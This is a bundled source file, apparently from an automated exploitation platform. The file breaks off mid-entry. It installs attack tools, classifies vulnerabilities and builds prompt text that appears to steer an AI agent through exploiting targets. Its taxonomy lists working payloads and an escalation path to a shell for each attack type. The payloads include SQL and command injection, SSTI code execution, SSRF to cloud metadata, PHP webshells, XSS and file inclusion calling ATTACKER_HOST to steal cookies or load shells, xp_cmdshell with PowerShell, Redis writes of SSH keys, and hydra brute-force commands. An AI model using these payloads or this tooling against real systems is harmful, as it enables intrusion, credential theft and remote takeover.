import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/exploit-tooling-framework.ts
function buildToolRegistry() {
  const registry = /* @__PURE__ */ new Map();
  for (const exploitType of EXPLOIT_TYPE_TAXONOMY) {
    for (const tool of exploitType.tools) {
      const existing = registry.get(tool.name);
      if (existing) {
        if (!existing.usedBy.includes(exploitType.category)) {
          existing.usedBy.push(exploitType.category);
        }
      } else {
        registry.set(tool.name, {
          name: tool.name,
          category: tool.category,
          verifyCommand: tool.verifyCommand,
          installCommand: tool.installCommand,
          alternatives: tool.alternatives || [],
          usedBy: [exploitType.category]
        });
      }
    }
  }
  return Array.from(registry.values());
}
async function provisionForExploit(category, executeCommand, options) {
  const startTime = Date.now();
  const exploitType = EXPLOIT_TYPE_TAXONOMY.find((t) => t.category === category);
  if (!exploitType) {
    return {
      exploitCategory: category,
      target: "unknown",
      results: [],
      allRequiredAvailable: false,
      missingRequired: [`Unknown exploit category: ${category}`],
      totalDurationMs: 0
    };
  }
  const results = [];
  const maxTime = (options?.maxTotalTimeSeconds || 120) * 1e3;
  for (const tool of exploitType.tools) {
    if (Date.now() - startTime > maxTime) {
      results.push({
        tool: tool.name,
        status: "skipped",
        message: "Skipped \u2014 total provision time exceeded",
        durationMs: 0
      });
      continue;
    }
    const checkStart = Date.now();
    try {
      const checkResult = await executeCommand(tool.verifyCommand, 10);
      if (checkResult.exitCode === 0 && !checkResult.stderr.includes("not found")) {
        results.push({
          tool: tool.name,
          status: "available",
          message: "Already installed",
          durationMs: Date.now() - checkStart
        });
        continue;
      }
    } catch {
    }
    if (options?.checkOnly) {
      results.push({
        tool: tool.name,
        status: "failed",
        message: "Not available (check-only mode)",
        durationMs: Date.now() - checkStart
      });
      continue;
    }
    try {
      const installTimeout = tool.installTimeSeconds || 60;
      const installResult = await executeCommand(tool.installCommand, installTimeout);
      if (installResult.exitCode === 0) {
        try {
          const verifyResult = await executeCommand(tool.verifyCommand, 10);
          if (verifyResult.exitCode === 0) {
            results.push({
              tool: tool.name,
              status: "installed",
              message: "Successfully installed and verified",
              durationMs: Date.now() - checkStart
            });
            continue;
          }
        } catch {
        }
      }
      let altInstalled = false;
      for (const alt of tool.alternatives || []) {
        try {
          const altCheck = await executeCommand(`which ${alt} || ${alt} --version`, 5);
          if (altCheck.exitCode === 0) {
            results.push({
              tool: tool.name,
              status: "available",
              message: `Alternative '${alt}' is available`,
              durationMs: Date.now() - checkStart
            });
            altInstalled = true;
            break;
          }
        } catch {
          continue;
        }
      }
      if (!altInstalled) {
        results.push({
          tool: tool.name,
          status: "failed",
          message: `Installation failed: ${installResult.stderr?.slice(0, 200) || "unknown error"}`,
          durationMs: Date.now() - checkStart
        });
      }
    } catch (err) {
      results.push({
        tool: tool.name,
        status: "failed",
        message: `Installation error: ${err.message}`,
        durationMs: Date.now() - checkStart
      });
    }
  }
  const missingPythonLibs = [];
  for (const lib of exploitType.pythonLibs) {
    if (Date.now() - startTime > maxTime) break;
    if (["socket", "subprocess", "os", "struct", "base64", "pickle", "hmac", "hashlib", "http.server"].includes(lib)) {
      continue;
    }
    try {
      const checkResult = await executeCommand(`python3 -c "import ${lib.replace("-", "_")}"`, 5);
      if (checkResult.exitCode !== 0) {
        missingPythonLibs.push(lib);
      }
    } catch {
      missingPythonLibs.push(lib);
    }
  }
  if (missingPythonLibs.length > 0 && !options?.checkOnly) {
    try {
      await executeCommand(`pip3 install --quiet ${missingPythonLibs.join(" ")} 2>/dev/null || true`, 60);
    } catch {
    }
  }
  const missingRequired = exploitType.tools.filter((t) => t.required).filter((t) => {
    const result = results.find((r) => r.tool === t.name);
    return !result || result.status === "failed";
  }).map((t) => t.name);
  return {
    exploitCategory: category,
    target: "scan_server",
    results,
    allRequiredAvailable: missingRequired.length === 0,
    missingRequired,
    totalDurationMs: Date.now() - startTime
  };
}
function classifyVulnerability(vuln) {
  const text = `${vuln.title} ${vuln.description || ""} ${vuln.cve || ""}`.toLowerCase();
  const patterns = [
    { pattern: /sql\s*inject|sqli|blind.*sql|union.*select/i, category: "sql_injection" },
    { pattern: /command\s*inject|os\s*command|rce.*command/i, category: "command_injection" },
    { pattern: /reflected.*xss|xss.*reflected/i, category: "xss_reflected" },
    { pattern: /stored.*xss|xss.*stored|persistent.*xss/i, category: "xss_stored" },
    { pattern: /dom.*xss|xss.*dom/i, category: "xss_dom" },
    { pattern: /template\s*inject|ssti/i, category: "ssti" },
    { pattern: /ssrf|server.*side.*request/i, category: "ssrf" },
    { pattern: /file\s*upload|unrestricted.*upload/i, category: "file_upload" },
    { pattern: /local\s*file\s*inclu|lfi/i, category: "lfi" },
    { pattern: /remote\s*file\s*inclu|rfi/i, category: "rfi" },
    { pattern: /path\s*travers|directory\s*travers/i, category: "path_traversal" },
    { pattern: /deserializ|insecure.*unserializ/i, category: "deserialization" },
    { pattern: /xxe|xml.*external.*entity/i, category: "xxe" },
    { pattern: /idor|insecure.*direct.*object/i, category: "idor" },
    { pattern: /auth.*bypass|bypass.*auth/i, category: "auth_bypass" },
    { pattern: /brute.*force|password.*spray/i, category: "brute_force" },
    { pattern: /default.*cred|weak.*password|factory.*password/i, category: "default_credentials" },
    { pattern: /buffer\s*overflow|stack.*overflow|heap.*overflow/i, category: "buffer_overflow" },
    { pattern: /jwt|json.*web.*token/i, category: "jwt_attack" },
    { pattern: /cors.*misconfig/i, category: "cors_misconfiguration" },
    { pattern: /crlf.*inject/i, category: "crlf_injection" },
    { pattern: /request.*smuggl/i, category: "http_request_smuggling" },
    { pattern: /graphql/i, category: "graphql_exploitation" },
    { pattern: /redis/i, category: "redis_exploitation" },
    { pattern: /kerberoast/i, category: "kerberoasting" }
  ];
  if (vuln.service) {
    const svc = vuln.service.toLowerCase();
    if (svc.includes("mssql") || svc.includes("ms-sql")) return "mssql_exploitation";
    if (svc.includes("mysql")) return "mysql_exploitation";
    if (svc.includes("postgresql") || svc.includes("postgres")) return "postgresql_exploitation";
    if (svc.includes("vnc")) return "vnc_exploitation";
    if (svc.includes("redis")) return "redis_exploitation";
    if (svc.includes("ldap")) return "ldap_injection";
    if (svc.includes("smtp")) return "smtp_exploitation";
    if (svc.includes("snmp")) return "snmp_exploitation";
  }
  for (const { pattern, category } of patterns) {
    if (pattern.test(text)) return category;
  }
  return null;
}
function buildExploitTypeContext(category) {
  const exploitType = EXPLOIT_TYPE_TAXONOMY.find((t) => t.category === category);
  if (!exploitType) return "";
  const lines = [];
  lines.push(`## Exploit Type: ${exploitType.name}`);
  lines.push(`Category: ${exploitType.category}`);
  lines.push(`Description: ${exploitType.description}`);
  lines.push(`Primary Method: ${exploitType.primaryMethod}`);
  lines.push(`Alternative Methods: ${exploitType.alternativeMethods.join(", ")}`);
  lines.push(`Can Achieve Shell: ${exploitType.canAchieveShell ? "YES" : "NO"}`);
  if (exploitType.shellEscalationPath) {
    lines.push(`Shell Escalation Path: ${exploitType.shellEscalationPath}`);
  }
  lines.push(`Risk Level: ${exploitType.riskLevel}/10`);
  lines.push(`Default Timeout: ${exploitType.defaultTimeout}s`);
  lines.push("");
  lines.push("### Required Tools:");
  for (const tool of exploitType.tools) {
    const req = tool.required ? "[REQUIRED]" : "[OPTIONAL]";
    const alts = tool.alternatives?.length ? ` (alternatives: ${tool.alternatives.join(", ")})` : "";
    lines.push(`- ${tool.name} ${req}${alts}`);
  }
  lines.push("");
  lines.push("### Python Libraries:");
  lines.push(exploitType.pythonLibs.join(", ") || "None");
  lines.push("");
  lines.push("### Payload Patterns:");
  for (const p of exploitType.payloadPatterns.slice(0, 5)) {
    lines.push(`- ${p}`);
  }
  lines.push("");
  lines.push("### Success Indicators (look for in output):");
  lines.push(exploitType.successIndicators.join(", "));
  lines.push("");
  lines.push("### MITRE ATT&CK: " + exploitType.mitreTechniques.join(", "));
  return lines.join("\n");
}
function buildTaxonomySummaryForPrompt() {
  const lines = [];
  lines.push("## Available Exploit Types & Required Tooling");
  lines.push("");
  const shellCapable = EXPLOIT_TYPE_TAXONOMY.filter((t) => t.canAchieveShell);
  const noShell = EXPLOIT_TYPE_TAXONOMY.filter((t) => !t.canAchieveShell);
  lines.push("### Shell-Capable Exploit Types:");
  for (const t of shellCapable) {
    const tools = t.tools.filter((tool) => tool.required).map((tool) => tool.name).join(", ");
    lines.push(`- **${t.name}** (${t.category}): ${t.primaryMethod} | Tools: ${tools || "python3+requests"} | Escalation: ${t.shellEscalationPath?.split("\u2192").slice(-1)[0]?.trim() || "direct"}`);
  }
  lines.push("");
  lines.push("### Non-Shell Exploit Types (proof of impact):");
  for (const t of noShell) {
    lines.push(`- **${t.name}** (${t.category}): ${t.primaryMethod} | Proves: data access, auth bypass, or client-side impact`);
  }
  return lines.join("\n");
}
function formatProvisionReportForPrompt(report) {
  const lines = [];
  lines.push(`## Tool Availability for ${report.exploitCategory}`);
  lines.push(`All required tools available: ${report.allRequiredAvailable ? "YES" : "NO"}`);
  if (report.missingRequired.length > 0) {
    lines.push(`\u26A0\uFE0F Missing required tools: ${report.missingRequired.join(", ")}`);
    lines.push("You MUST use alternative approaches that don't require these tools.");
  }
  lines.push("");
  for (const r of report.results) {
    const icon = r.status === "available" || r.status === "installed" ? "\u2705" : r.status === "skipped" ? "\u23ED\uFE0F" : "\u274C";
    lines.push(`${icon} ${r.tool}: ${r.status} \u2014 ${r.message}`);
  }
  return lines.join("\n");
}
var EXPLOIT_TYPE_TAXONOMY;
var init_exploit_tooling_framework = __esm({
  "server/lib/exploit-tooling-framework.ts"() {
    EXPLOIT_TYPE_TAXONOMY = [
      // ── Injection Exploits ──────────────────────────────────────────────────
      {
        category: "sql_injection",
        name: "SQL Injection",
        description: "Inject SQL commands into application queries to extract data, bypass authentication, or achieve command execution. Escalation paths: MySQL\u2192INTO OUTFILE webshell, MSSQL\u2192xp_cmdshell, PostgreSQL\u2192COPY TO PROGRAM, SQLite\u2192attach+write.",
        mitreTechniques: ["T1190", "T1059"],
        cweIds: ["CWE-89"],
        primaryMethod: "cli_tool",
        alternativeMethods: ["python_script", "curl_chain"],
        tools: [
          { name: "sqlmap", category: "system_binary", verifyCommand: "which sqlmap", installCommand: "pip3 install sqlmap", required: true, alternatives: ["python3 -c 'import requests'"] },
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true }
        ],
        pythonLibs: ["requests", "urllib3", "beautifulsoup4"],
        payloadPatterns: [
          "' OR 1=1--",
          "' UNION SELECT",
          "'; EXEC xp_cmdshell",
          "' AND SLEEP(5)--",
          "1' ORDER BY",
          "LOAD_FILE('/etc/passwd')"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "extracted.*data", "admin.*access", "password", "database.*version", "rows.*returned"],
        failureIndicators: ["EXPLOIT_FAILED", "syntax.*error", "blocked.*waf", "connection.*refused"],
        canAchieveShell: true,
        shellEscalationPath: "SQLi \u2192 data extraction \u2192 identify DB type \u2192 MSSQL: xp_cmdshell, MySQL: INTO OUTFILE webshell, PostgreSQL: COPY TO PROGRAM \u2192 reverse shell",
        targetServices: ["http", "https", "mysql", "mssql", "postgresql"],
        targetPorts: [80, 443, 8080, 3306, 1433, 5432],
        riskLevel: 8,
        defaultTimeout: 120,
        tags: ["injection", "web", "database", "data_extraction"]
      },
      {
        category: "command_injection",
        name: "OS Command Injection",
        description: "Inject OS commands through application input fields. Direct path to shell \u2014 no escalation needed. Test with command separators: ;, |, &&, ||, `, $(), newline.",
        mitreTechniques: ["T1059.004", "T1190"],
        cweIds: ["CWE-78"],
        primaryMethod: "python_script",
        alternativeMethods: ["curl_chain", "bash_script"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true },
          { name: "curl", category: "system_binary", verifyCommand: "which curl", installCommand: "apt-get install -y curl", required: false },
          { name: "commix", category: "system_binary", verifyCommand: "which commix || test -f /opt/commix/commix.py", installCommand: "cd /opt && git clone https://github.com/commixproject/commix.git 2>/dev/null || true && cd /opt/commix && pip3 install -r requirements.txt 2>/dev/null || true && ln -sf /opt/commix/commix.py /usr/local/bin/commix 2>/dev/null || true", required: true, alternatives: ["manual curl"] }
        ],
        pythonLibs: ["requests"],
        payloadPatterns: [
          "; whoami",
          "| cat /etc/passwd",
          "&& id",
          "$(whoami)",
          "`id`",
          "\nid",
          "|| ping -c1 ATTACKER_HOST"
        ],
        successIndicators: ["uid=", "root", "www-data", "whoami", "EXPLOIT_SUCCESS"],
        failureIndicators: ["EXPLOIT_FAILED", "command.*not.*found", "blocked"],
        canAchieveShell: true,
        shellEscalationPath: "Command injection \u2192 verify execution (id/whoami) \u2192 reverse shell one-liner",
        targetServices: ["http", "https"],
        targetPorts: [80, 443, 8080, 8443],
        riskLevel: 9,
        defaultTimeout: 60,
        tags: ["injection", "web", "rce", "shell"]
      },
      {
        category: "ssti",
        name: "Server-Side Template Injection",
        description: "Inject template syntax into server-side template engines to achieve RCE. Identify engine first ({{7*7}}, ${7*7}, #{7*7}), then use engine-specific payloads for command execution.",
        mitreTechniques: ["T1059", "T1190"],
        cweIds: ["CWE-1336"],
        primaryMethod: "python_script",
        alternativeMethods: ["curl_chain"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true },
          { name: "tplmap", category: "custom_script", verifyCommand: "which tplmap || test -f /opt/tplmap/tplmap.py", installCommand: "cd /opt && git clone https://github.com/epinna/tplmap.git 2>/dev/null || true && cd /opt/tplmap && pip3 install -r requirements.txt 2>/dev/null || true && ln -sf /opt/tplmap/tplmap.py /usr/local/bin/tplmap 2>/dev/null || true && chmod +x /opt/tplmap/tplmap.py", required: true }
        ],
        pythonLibs: ["requests"],
        payloadPatterns: [
          "{{7*7}}",
          "{{config}}",
          "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
          "${7*7}",
          "#{7*7}",
          "<%= system('id') %>"
        ],
        successIndicators: ["49", "uid=", "EXPLOIT_SUCCESS", "config", "os.popen"],
        failureIndicators: ["EXPLOIT_FAILED", "template.*error", "undefined"],
        canAchieveShell: true,
        shellEscalationPath: "SSTI \u2192 identify engine \u2192 engine-specific RCE payload \u2192 reverse shell",
        targetServices: ["http", "https"],
        targetPorts: [80, 443, 8080, 5e3, 3e3],
        riskLevel: 9,
        defaultTimeout: 60,
        tags: ["injection", "web", "rce", "template"]
      },
      {
        category: "ssrf",
        name: "Server-Side Request Forgery",
        description: "Force the server to make requests to internal services. Chain with internal service exploits (Redis, Memcached, cloud metadata) for RCE.",
        mitreTechniques: ["T1190", "T1552.005"],
        cweIds: ["CWE-918"],
        primaryMethod: "python_script",
        alternativeMethods: ["curl_chain"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true }
        ],
        pythonLibs: ["requests", "urllib3"],
        payloadPatterns: [
          "http://169.254.169.254/latest/meta-data/",
          "http://localhost:6379/",
          "gopher://localhost:6379/",
          "file:///etc/passwd",
          "http://127.0.0.1:8080/admin",
          "dict://localhost:11211/"
        ],
        successIndicators: ["ami-id", "instance-id", "EXPLOIT_SUCCESS", "internal.*service", "redis", "root:x:"],
        failureIndicators: ["EXPLOIT_FAILED", "connection.*refused", "timeout"],
        canAchieveShell: true,
        shellEscalationPath: "SSRF \u2192 access internal Redis/Memcached \u2192 write webshell or SSH key \u2192 shell",
        targetServices: ["http", "https"],
        targetPorts: [80, 443, 8080],
        riskLevel: 8,
        defaultTimeout: 60,
        tags: ["web", "internal_access", "cloud"]
      },
      // ── File-Based Exploits ─────────────────────────────────────────────────
      {
        category: "file_upload",
        name: "Unrestricted File Upload",
        description: "Upload malicious files (webshells, executables) through file upload functionality. Bypass filters using extension tricks, content-type manipulation, magic bytes, and null bytes.",
        mitreTechniques: ["T1505.003", "T1190"],
        cweIds: ["CWE-434"],
        primaryMethod: "python_script",
        alternativeMethods: ["curl_chain"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true }
        ],
        pythonLibs: ["requests"],
        payloadPatterns: [
          "<?php system($_GET['cmd']); ?>",
          "GIF89a<?php system($_GET['cmd']); ?>",
          ".php5, .phtml, .phar, .php.jpg"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "uploaded", "shell.*access", "uid="],
        failureIndicators: ["EXPLOIT_FAILED", "file.*type.*not.*allowed", "upload.*failed"],
        canAchieveShell: true,
        shellEscalationPath: "Upload webshell \u2192 access webshell URL \u2192 execute reverse shell command",
        targetServices: ["http", "https"],
        targetPorts: [80, 443, 8080],
        riskLevel: 9,
        defaultTimeout: 60,
        tags: ["web", "file", "webshell", "rce"]
      },
      {
        category: "lfi",
        name: "Local File Inclusion",
        description: "Include local files from the server through path traversal in include/require functions. Escalate via log poisoning, PHP wrappers, or /proc/self/environ injection.",
        mitreTechniques: ["T1005", "T1190"],
        cweIds: ["CWE-98"],
        primaryMethod: "python_script",
        alternativeMethods: ["curl_chain"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true }
        ],
        pythonLibs: ["requests"],
        payloadPatterns: [
          "../../etc/passwd",
          "php://filter/convert.base64-encode/resource=",
          "php://input",
          "/proc/self/environ",
          "data://text/plain;base64,"
        ],
        successIndicators: ["root:x:", "EXPLOIT_SUCCESS", "base64.*decode", "<?php"],
        failureIndicators: ["EXPLOIT_FAILED", "file.*not.*found", "open_basedir"],
        canAchieveShell: true,
        shellEscalationPath: "LFI \u2192 read sensitive files \u2192 log poisoning (inject PHP in User-Agent \u2192 include log) \u2192 webshell \u2192 reverse shell",
        targetServices: ["http", "https"],
        targetPorts: [80, 443, 8080],
        riskLevel: 7,
        defaultTimeout: 60,
        tags: ["web", "file", "path_traversal"]
      },
      {
        category: "rfi",
        name: "Remote File Inclusion",
        description: "Include remote files from attacker-controlled server. Direct path to shell by including a hosted PHP webshell.",
        mitreTechniques: ["T1190", "T1059"],
        cweIds: ["CWE-98"],
        primaryMethod: "python_script",
        alternativeMethods: ["curl_chain"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true },
          { name: "python3", category: "system_binary", verifyCommand: "which python3", installCommand: "apt-get install -y python3", required: true }
        ],
        pythonLibs: ["requests", "http.server"],
        payloadPatterns: ["?page=http://ATTACKER_HOST/shell.php", "?file=http://ATTACKER_HOST/shell.txt"],
        successIndicators: ["EXPLOIT_SUCCESS", "uid=", "shell.*access"],
        failureIndicators: ["EXPLOIT_FAILED", "allow_url_include.*off"],
        canAchieveShell: true,
        shellEscalationPath: "RFI \u2192 include attacker-hosted PHP shell \u2192 execute reverse shell",
        targetServices: ["http", "https"],
        targetPorts: [80, 443, 8080],
        riskLevel: 9,
        defaultTimeout: 60,
        tags: ["web", "file", "rce"]
      },
      // ── XSS Exploits ───────────────────────────────────────────────────────
      {
        category: "xss_reflected",
        name: "Reflected Cross-Site Scripting",
        description: "Inject JavaScript that executes in the victim's browser via reflected input. Prove impact by stealing cookies, session tokens, or demonstrating DOM manipulation.",
        mitreTechniques: ["T1189"],
        cweIds: ["CWE-79"],
        primaryMethod: "python_script",
        alternativeMethods: ["curl_chain", "cli_tool"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true },
          { name: "dalfox", category: "go_binary", verifyCommand: "which dalfox", installCommand: "go install github.com/hahwul/dalfox/v2@latest 2>/dev/null || true", required: false }
        ],
        pythonLibs: ["requests", "beautifulsoup4"],
        payloadPatterns: [
          "<script>alert(1)</script>",
          "<img src=x onerror=alert(1)>",
          `'"><script>alert(document.cookie)</script>`
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "script.*reflected", "alert", "cookie"],
        failureIndicators: ["EXPLOIT_FAILED", "sanitized", "encoded"],
        canAchieveShell: false,
        targetServices: ["http", "https"],
        targetPorts: [80, 443, 8080],
        riskLevel: 5,
        defaultTimeout: 30,
        tags: ["web", "client_side", "xss"]
      },
      {
        category: "xss_stored",
        name: "Stored Cross-Site Scripting",
        description: "Inject persistent JavaScript that executes for all users viewing the affected page. Higher impact than reflected \u2014 can steal admin sessions.",
        mitreTechniques: ["T1189"],
        cweIds: ["CWE-79"],
        primaryMethod: "python_script",
        alternativeMethods: ["curl_chain"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true }
        ],
        pythonLibs: ["requests", "beautifulsoup4"],
        payloadPatterns: [
          "<script>document.location='http://ATTACKER_HOST/?c='+document.cookie</script>",
          `<img src=x onerror='fetch("http://ATTACKER_HOST/"+document.cookie)'>`
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "stored", "persistent", "cookie"],
        failureIndicators: ["EXPLOIT_FAILED", "sanitized"],
        canAchieveShell: false,
        targetServices: ["http", "https"],
        targetPorts: [80, 443, 8080],
        riskLevel: 7,
        defaultTimeout: 30,
        tags: ["web", "client_side", "xss", "persistent"]
      },
      // ── Authentication Exploits ─────────────────────────────────────────────
      {
        category: "brute_force",
        name: "Credential Brute Force",
        description: "Systematically try username/password combinations against authentication endpoints. Use wordlists (rockyou, SecLists) and tools (hydra, medusa, patator).",
        mitreTechniques: ["T1110.001", "T1110.003"],
        cweIds: ["CWE-307"],
        primaryMethod: "cli_tool",
        alternativeMethods: ["python_script"],
        tools: [
          { name: "hydra", category: "system_binary", verifyCommand: "which hydra", installCommand: "apt-get install -y hydra", required: true, alternatives: ["medusa", "ncrack"] },
          { name: "medusa", category: "system_binary", verifyCommand: "which medusa", installCommand: "apt-get install -y medusa", required: false },
          { name: "ncrack", category: "system_binary", verifyCommand: "which ncrack", installCommand: "apt-get install -y ncrack", required: false }
        ],
        pythonLibs: ["requests", "paramiko"],
        payloadPatterns: [
          "hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ssh",
          "hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form"
        ],
        successIndicators: ["login.*success", "valid.*password", "EXPLOIT_SUCCESS", "session.*created"],
        failureIndicators: ["EXPLOIT_FAILED", "all.*attempts.*exhausted", "account.*locked"],
        canAchieveShell: true,
        shellEscalationPath: "Brute force \u2192 valid credentials \u2192 SSH/RDP/WinRM login \u2192 shell",
        targetServices: ["ssh", "ftp", "http", "rdp", "smb", "telnet", "vnc", "mysql", "mssql"],
        targetPorts: [22, 21, 80, 443, 3389, 445, 23, 5900, 3306, 1433],
        riskLevel: 6,
        defaultTimeout: 300,
        tags: ["auth", "credentials", "brute_force"]
      },
      {
        category: "default_credentials",
        name: "Default/Weak Credentials",
        description: "Test for default, factory, or commonly-used credentials on services and management interfaces. Many devices and applications ship with known default passwords.",
        mitreTechniques: ["T1078.001"],
        cweIds: ["CWE-798", "CWE-1393"],
        primaryMethod: "python_script",
        alternativeMethods: ["cli_tool", "curl_chain"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true },
          { name: "hydra", category: "system_binary", verifyCommand: "which hydra", installCommand: "apt-get install -y hydra", required: false }
        ],
        pythonLibs: ["requests", "paramiko"],
        payloadPatterns: [
          "admin:admin",
          "admin:password",
          "root:root",
          "admin:123456",
          "tomcat:tomcat",
          "manager:manager",
          "test:test"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "login.*success", "authenticated", "welcome.*admin"],
        failureIndicators: ["EXPLOIT_FAILED", "invalid.*credentials", "access.*denied"],
        canAchieveShell: true,
        shellEscalationPath: "Default creds \u2192 authenticated access \u2192 find admin panel/console \u2192 RCE",
        targetServices: ["ssh", "http", "https", "ftp", "telnet", "mysql", "mssql", "vnc"],
        targetPorts: [22, 80, 443, 21, 23, 3306, 1433, 5900, 8080, 8443],
        riskLevel: 5,
        defaultTimeout: 60,
        tags: ["auth", "credentials", "default"]
      },
      {
        category: "auth_bypass",
        name: "Authentication Bypass",
        description: "Bypass authentication mechanisms through logic flaws, parameter manipulation, forced browsing, or JWT/session token manipulation.",
        mitreTechniques: ["T1078", "T1190"],
        cweIds: ["CWE-287", "CWE-306"],
        primaryMethod: "python_script",
        alternativeMethods: ["curl_chain"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true },
          { name: "jwt", category: "python_lib", verifyCommand: "python3 -c 'import jwt'", installCommand: "pip3 install PyJWT", required: false }
        ],
        pythonLibs: ["requests", "PyJWT"],
        payloadPatterns: [
          "admin' OR '1'='1",
          "X-Forwarded-For: 127.0.0.1",
          "Authorization: Bearer {forged_jwt}",
          "/admin/../../../etc/passwd"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "admin.*access", "bypass", "authenticated"],
        failureIndicators: ["EXPLOIT_FAILED", "unauthorized", "forbidden"],
        canAchieveShell: false,
        targetServices: ["http", "https"],
        targetPorts: [80, 443, 8080],
        riskLevel: 8,
        defaultTimeout: 60,
        tags: ["auth", "web", "bypass"]
      },
      // ── Network Service Exploits ────────────────────────────────────────────
      {
        category: "mssql_exploitation",
        name: "MSSQL Exploitation",
        description: "Exploit Microsoft SQL Server via xp_cmdshell, linked servers, OLE automation, CLR assemblies, or credential extraction. Direct path to shell via xp_cmdshell.",
        mitreTechniques: ["T1059.001", "T1505.001", "T1210"],
        cweIds: ["CWE-89"],
        primaryMethod: "python_script",
        alternativeMethods: ["cli_tool", "metasploit"],
        tools: [
          { name: "impacket", category: "python_lib", verifyCommand: "python3 -c 'from impacket.tds import MSSQL'", installCommand: "pip3 install impacket", required: true },
          { name: "mssqlclient.py", category: "python_lib", verifyCommand: "which mssqlclient.py || python3 -c 'from impacket.examples.mssqlclient import *'", installCommand: "pip3 install impacket", required: false }
        ],
        pythonLibs: ["impacket", "pymssql"],
        payloadPatterns: [
          "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'",
          `EXEC master..xp_cmdshell 'powershell -nop -c "IEX(...)"'`
        ],
        successIndicators: ["xp_cmdshell", "nt authority", "EXPLOIT_SUCCESS", "sa.*login"],
        failureIndicators: ["EXPLOIT_FAILED", "xp_cmdshell.*disabled", "login.*failed"],
        canAchieveShell: true,
        shellEscalationPath: "MSSQL access \u2192 enable xp_cmdshell \u2192 execute reverse shell payload",
        targetServices: ["mssql", "ms-sql-s"],
        targetPorts: [1433, 1434],
        riskLevel: 9,
        defaultTimeout: 90,
        tags: ["database", "network", "rce", "windows"]
      },
      {
        category: "mysql_exploitation",
        name: "MySQL Exploitation",
        description: "Exploit MySQL via UDF injection, INTO OUTFILE webshell, or credential extraction. Requires write permissions for file-based attacks.",
        mitreTechniques: ["T1210", "T1505.001"],
        cweIds: ["CWE-89"],
        primaryMethod: "python_script",
        alternativeMethods: ["cli_tool"],
        tools: [
          { name: "mysql", category: "system_binary", verifyCommand: "which mysql", installCommand: "apt-get install -y mysql-client", required: false },
          { name: "pymysql", category: "python_lib", verifyCommand: "python3 -c 'import pymysql'", installCommand: "pip3 install pymysql", required: true }
        ],
        pythonLibs: ["pymysql", "requests"],
        payloadPatterns: [
          `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'`,
          "SELECT LOAD_FILE('/etc/passwd')"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "root:x:", "webshell.*written", "file.*created"],
        failureIndicators: ["EXPLOIT_FAILED", "access.*denied", "secure_file_priv"],
        canAchieveShell: true,
        shellEscalationPath: "MySQL access \u2192 INTO OUTFILE webshell or UDF \u2192 reverse shell",
        targetServices: ["mysql"],
        targetPorts: [3306],
        riskLevel: 8,
        defaultTimeout: 60,
        tags: ["database", "network", "rce"]
      },
      {
        category: "redis_exploitation",
        name: "Redis Exploitation",
        description: "Exploit unauthenticated or weakly-authenticated Redis instances. Write SSH keys, webshells, or crontab entries for RCE.",
        mitreTechniques: ["T1210", "T1552.001"],
        cweIds: ["CWE-306"],
        primaryMethod: "python_script",
        alternativeMethods: ["cli_tool", "bash_script"],
        tools: [
          { name: "redis-cli", category: "system_binary", verifyCommand: "which redis-cli", installCommand: "apt-get install -y redis-tools", required: false, alternatives: ["python3 redis"] },
          { name: "redis", category: "python_lib", verifyCommand: "python3 -c 'import redis'", installCommand: "pip3 install redis", required: true }
        ],
        pythonLibs: ["redis"],
        payloadPatterns: [
          `CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php; SET x '<?php system($_GET["cmd"]); ?>'; SAVE`,
          "CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys; SET x 'ssh-rsa AAAA...'; SAVE"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "OK", "webshell.*written", "key.*written"],
        failureIndicators: ["EXPLOIT_FAILED", "NOAUTH", "ERR"],
        canAchieveShell: true,
        shellEscalationPath: "Redis no-auth \u2192 write SSH key or webshell \u2192 shell access",
        targetServices: ["redis"],
        targetPorts: [6379],
        riskLevel: 9,
        defaultTimeout: 60,
        tags: ["database", "network", "rce", "no_auth"]
      },
      {
        category: "vnc_exploitation",
        name: "VNC Exploitation",
        description: "Exploit VNC services via authentication bypass, brute force, clipboard hijacking, or keystroke injection.",
        mitreTechniques: ["T1021.005", "T1110.001"],
        cweIds: ["CWE-287"],
        primaryMethod: "python_script",
        alternativeMethods: ["cli_tool"],
        tools: [
          { name: "hydra", category: "system_binary", verifyCommand: "which hydra", installCommand: "apt-get install -y hydra", required: false },
          { name: "vncviewer", category: "system_binary", verifyCommand: "which vncviewer || true", installCommand: "apt-get install -y tigervnc-viewer 2>/dev/null || true", required: false }
        ],
        pythonLibs: ["socket", "struct"],
